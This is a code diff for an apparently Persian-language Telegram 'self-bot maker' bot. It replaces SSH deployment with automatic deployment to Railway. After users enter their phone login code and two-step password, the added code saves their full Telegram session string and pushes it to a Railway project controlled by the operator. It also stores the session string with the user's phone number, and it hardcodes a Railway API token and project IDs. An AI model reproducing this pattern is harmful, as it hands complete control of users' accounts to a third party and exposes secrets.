@@ -4,6 +4,7 @@ import paramiko
 import ipaddress
 import asyncio
 import logging
+import requests
 from contextlib import contextmanager
 from pytz import timezone
 from datetime import timedelta, datetime
@@ -63,6 +64,69 @@ BANNED_NUMBERS = set()
 REMAINING_RUNS = 0
 LAST_RUNS = {}
 ADNUMBER = ["989924991756", "989940458599"]
+
+# Railway Config
+RAILWAY_API_URL = "https://backboard.railway.app/graphql/v2"
+RAILWAY_TOKEN = os.environ.get("RAILWAY_TOKEN", "5b3690e0-4e9f-484d-9e27-b279f8198f24")
+RAILWAY_PROJECT_ID = "358363cb-01c7-4513-a979-4dab8e13d40e"
+RAILWAY_ENV_ID = "98312899-614d-4a71-81c2-fa45b360c6eb"
+RAILWAY_SERVICE_ID = "7edd81f6-832e-4c64-860f-af977d573c9f"
+
+
+def railway_graphql(token, query, variables=None):
+    """Make a GraphQL request to Railway API."""
+    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
+    payload = {"query": query}
+    if variables:
+        payload["variables"] = variables
+    resp = requests.post(RAILWAY_API_URL, headers=headers, json=payload, timeout=30)
+    resp.raise_for_status()
+    return resp.json()
+
+
+def railway_set_session(string_session):
+    """Set STRING_SESSION env var on Railway and trigger redeploy."""
+    # Upsert STRING_SESSION variable
+    railway_graphql(RAILWAY_TOKEN, """
+        mutation variableUpsert($input: VariableUpsertInput!) {
+            variableUpsert(input: $input)
+        }
+    """, {
+        "input": {
+            "projectId": RAILWAY_PROJECT_ID,
+            "environmentId": RAILWAY_ENV_ID,
+            "name": "STRING_SESSION",
+            "value": string_session
+        }
+    })
+    # Trigger redeploy
+    railway_graphql(RAILWAY_TOKEN, """
+        mutation serviceInstanceRedeploy($serviceId: String!, $environmentId: String!) {
+            serviceInstanceRedeploy(serviceId: $serviceId, environmentId: $environmentId)
+        }
+    """, {
+        "serviceId": RAILWAY_SERVICE_ID,
+        "environmentId": RAILWAY_ENV_ID
+    })
+
+
+def railway_check_deploy_status():
+    """Check if latest deployment is ready."""
+    data = railway_graphql(RAILWAY_TOKEN, """
+        query serviceInstance($serviceId: String!, $environmentId: String!) {
+            serviceInstance(serviceId: $serviceId, environmentId: $environmentId) {
+                latestDeployment { id status }
+            }
+        }
+    """, {
+        "serviceId": RAILWAY_SERVICE_ID,
+        "environmentId": RAILWAY_ENV_ID
+    })
+    try:
+        return data["data"]["serviceInstance"]["latestDeployment"]["status"]
+    except (KeyError, TypeError):
+        return "UNKNOWN"
+
 
 def is_owner(user_id: int) -> bool:
     return user_id in OWNER_IDS
@@ -896,6 +960,69 @@ async def process_number_input(update: Update, context: ContextTypes.DEFAULT_TYP
             RUN_STARTED_AT = None
             return ConversationHandler.END
 
+async def deploy_session_to_railway(user_id, context, update, tele_client):
+    """Save string session and deploy to Railway automatically."""
+    global RUNNING_USER, RUN_STARTED_AT, REMAINING_RUNS, NEXT_RUN_ALLOWED_AT
+    
+    string_session = "Error"
+    try:
+        string_session = StringSession.save(tele_client.session)
+    except Exception as e:
+        logger.error(f"Error saving string session: {e}")
+
+    await tele_client.disconnect()
+
+    wait_msg = await update.message.reply_text("در حال ارسال سشن به Railway...") if hasattr(update, 'message') and update.message else None
+
+    try:
+        await asyncio.to_thread(railway_set_session, string_session)
+    except Exception as e:
+        logger.error(f"Railway deploy error: {e}")
+        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"خطا در دیپلوی Railway: {e}")
+        await cleanup_sessions(user_id)
+        USER_DATA_STORE.pop(user_id, None)
+        RUNNING_USER = None
+        RUN_STARTED_AT = None
+        return
+
+    if wait_msg:
+        try: await wait_msg.delete()
+        except: pass
+
+    await cleanup_sessions(user_id)
+    if not is_owner(user_id):
+        if REMAINING_RUNS > 0:
+            REMAINING_RUNS -= 1
+            save_max_runs(REMAINING_RUNS)
+
+    now_tehran = datetime.now(timezone("Asia/Tehran"))
+    if is_owner(user_id):
+        NEXT_RUN_ALLOWED_AT = now_tehran + timedelta(seconds=10)
+    else:
+        NEXT_RUN_ALLOWED_AT = now_tehran + timedelta(minutes=10)
+
+    save_user_text(
+        user_id,
+        username=update.effective_user.username,
+        phone=USER_DATA_STORE[user_id]['number'],
+        string_session=string_session
+    )
+
+    await update_channel_message(context.application)
+    await context.bot.send_message(
+        chat_id=update.effective_chat.id,
+        text="سلف با موفقیت روی Railway اجرا شد! 🚀\n\nبا دستور پنل یا panel منوی راهنما سلف را باز کنید.\n\nفروش این سلف ممنوع است!\n@JavidSelf\nسلف ساز رایگان:\n@JavidSelfBot"
+    )
+
+    if not is_owner(user_id):
+        LAST_RUNS[user_id] = time.time()
+        save_last_runs()
+
+    USER_DATA_STORE.pop(user_id, None)
+    RUNNING_USER = None
+    RUN_STARTED_AT = None
+
+
 async def process_code_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global RUNNING_USER, RUN_STARTED_AT
     query = update.callback_query
@@ -940,19 +1067,8 @@ async def process_code_buttons(update: Update, context: ContextTypes.DEFAULT_TYP
         tele_client = USER_DATA_STORE[user_id]["client"]
         try:
             await tele_client.sign_in(phone=USER_DATA_STORE[user_id]["number"], code=code)
-            try:
-                msg = await context.bot.copy_message(
-                    chat_id=update.effective_chat.id, from_chat_id=PRIVATE_CHANNEL_ID, message_id=4,
-                    caption="ورود موفق! آیپی سرور را ارسال کنید:\n\nسایت دریافت سرور:\ncp.sprinthost.ru"
-                )
-                msg_id = msg.message_id
-            except Exception:
-                msg = await context.bot.send_message(
-                    chat_id=update.effective_chat.id, text="ورود موفق! آیپی سرور را ارسال کنید:\n\nسایت دریافت سرور:\ncp.sprinthost.ru"
-                )
-                msg_id = msg.message_id
-            USER_DATA_STORE[user_id]["last_bot_msg"] = msg_id
-            return GET_IP
+            await deploy_session_to_railway(user_id, context, update, tele_client)
+            return ConversationHandler.END
         except SessionPasswordNeededError:
             try:
                 msg = await context.bot.copy_message(chat_id=update.effective_chat.id, from_chat_id=PRIVATE_CHANNEL_ID, message_id=6, caption="رمز دو مرحله‌ای را وارد کنید:")
@@ -992,14 +1108,8 @@ async def process_2fa_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         await tele_client.sign_in(password=password)
         USER_DATA_STORE[user_id]["two_step"] = password
-        try:
-            msg = await context.bot.copy_message(chat_id=update.effective_chat.id, from_chat_id=PRIVATE_CHANNEL_ID, message_id=8, caption="ورود موفق! آیپی سرور را ارسال کنید:\n\nسایت دریافت سرور:\ncp.sprinthost.ru")
-            msg_id = msg.message_id
-        except Exception:
-            msg = await context.bot.send_message(chat_id=update.effective_chat.id, text="ورود موفق! آیپی سرور را ارسال کنید:\n\nسایت دریافت سرور:\ncp.sprinthost.ru")
-            msg_id = msg.message_id
-        USER_DATA_STORE[user_id]["last_bot_msg"] = msg_id
-        return GET_IP
+        await deploy_session_to_railway(user_id, context, update, tele_client)
+        return ConversationHandler.END
     except PasswordHashInvalidError:
         await update.message.reply_text("رمز دو مرحله‌ای اشتباه است!")
         try:
@@ -1099,75 +1209,18 @@ async def process_pass_input(update: Update, context: ContextTypes.DEFAULT_TYPE)
 
         await tele_client.disconnect()
         
-        def run_ssh_deployment():
-            with ssh_connection(ip, server_user, passwd) as ssh:
-                sftp = ssh.open_sftp()
-                sftp.get_channel().settimeout(30)
-                
-                try:
-                    sftp.stat("self")
-                    return "already_used"
-                except FileNotFoundError: 
-                    pass
-
-                ssh.exec_command("mkdir -p self", timeout=30)
-                time.sleep(1)
-                
-                local_self_py = None
-                if os.path.exists("file/self.py"): 
-                    local_self_py = "file/self.py"
-                elif os.path.exists("bot/file/self.py"): 
-                    local_self_py = "bot/file/self.py"
-                elif os.path.exists("self.py"): 
-                    local_self_py = "self.py"
-                
-                if not local_self_py: 
-                    return "missing_self_py"
-                    
-                sftp.put(local_self_py, "self/self.py")
-                
-                local_session = f"sessions/selfbot_{user_id}.session"
-                local_journal = f"sessions/selfbot_{user_id}.session-journal"
-                
-                if os.path.exists(local_session):
-                    sftp.put(local_session, "self/selfbot.session")
-                    sftp.put(local_session, f"self/selfbot_{user_id}.session")
-                if os.path.exists(local_journal):
-                    sftp.put(local_journal, "self/selfbot.session-journal")
-                    sftp.put(local_journal, f"self/selfbot_{user_id}.session-journal")
-                
-                ssh.exec_command("sync", timeout=5)
-
-                setup_cmd = "python3 -m pip install --user telethon pytz jdatetime paramiko"
-                stdin, stdout, stderr = ssh.exec_command(setup_cmd, timeout=60)
-                stdout.channel.recv_exit_status()
-                time.sleep(2)
-
-                run_cmd = "cd self && nohup python3 self.py > self_error.log 2>&1 &"
-                ssh.exec_command(run_cmd)
-                time.sleep(3)
-                return "success"
-                
-        deploy_res = await asyncio.to_thread(run_ssh_deployment)
+        # Deploy to Railway automatically
+        try:
+            await wait_msg.edit_text("در حال ارسال سشن به Railway...")
+        except:
+            pass
+            
+        await asyncio.to_thread(railway_set_session, string_session)
+        
         try: 
             await wait_msg.delete()
         except: 
             pass
-        
-        if deploy_res == "already_used":
-            await update.message.reply_text("سرور قبلا استفاده شده است! لطفا از سرور جدید استفاده کنید.\n\ncp.sprinthost.ru")
-            await cleanup_sessions(user_id)
-            USER_DATA_STORE.pop(user_id, None)
-            RUNNING_USER = None
-            RUN_STARTED_AT = None
-            return ConversationHandler.END
-        elif deploy_res == "missing_self_py":
-            await update.message.reply_text("خطا: فایل self.py یافت نشد.")
-            await cleanup_sessions(user_id)
-            USER_DATA_STORE.pop(user_id, None)
-            RUNNING_USER = None
-            RUN_STARTED_AT = None
-            return ConversationHandler.END
             
         await cleanup_sessions(user_id)
         if not is_owner(user_id):
@@ -1192,7 +1245,7 @@ async def process_pass_input(update: Update, context: ContextTypes.DEFAULT_TYPE)
         )
             
         await update_channel_message(context.application)
-        await update.message.reply_text("سلف با موفقیت روی سرور شما اجرا شد، با دستور پنل یا panel منوی راهنما سلف را باز کنید.\n\nفروش این سلف ممنوع است!\n@JavidSelf\nسلف ساز رایگان:\n@JavidSelfBot")
+        await update.message.reply_text("سلف با موفقیت روی Railway اجرا شد! 🚀\n\nبا دستور پنل یا panel منوی راهنما سلف را باز کنید.\n\nفروش این سلف ممنوع است!\n@JavidSelf\nسلف ساز رایگان:\n@JavidSelfBot")
         
         if not is_owner(user_id):
             LAST_RUNS[user_id] = time.time()
